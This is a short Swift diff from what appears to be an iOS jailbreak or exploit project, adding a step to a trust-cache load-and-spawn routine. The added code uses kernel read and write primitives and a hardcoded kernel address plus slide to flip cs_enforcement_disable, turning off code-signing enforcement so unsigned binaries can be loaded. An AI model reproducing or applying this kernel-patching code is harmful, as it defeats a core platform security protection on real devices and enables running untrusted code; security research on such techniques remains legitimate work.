@@ -42,6 +42,25 @@ final class ExpTCLoadAndSpawn {
         log("══ Phase 1: Load Trust Cache ══")
         log("")
         
+        // CRITICAL: Set cs_enforcement_disable = 1 FIRST
+        // Without this, IOServiceOpen to AMFI fails with 0xe00002c2
+        // This was proven on device: pmap_cs probe sets this → IOKit works
+        let slide = ds_get_kernel_slide()
+        let csDisableAddr = 0xfffffff00a160798 as UInt64 &+ slide
+        let before = ds_kread32(csDisableAddr)
+        if before != 1 {
+            ds_kwrite32(csDisableAddr, 1)
+            let after = ds_kread32(csDisableAddr)
+            if after == 1 {
+                log("✅ cs_enforcement_disable → 1")
+            } else {
+                log("⚠️ cs_enforcement_disable write failed")
+            }
+        } else {
+            log("✅ cs_enforcement_disable already 1")
+        }
+        log("")
+        
         // Build test binary + trust cache
         let testBin = buildBinary()
         let cdhash = sha256t20(testBin)
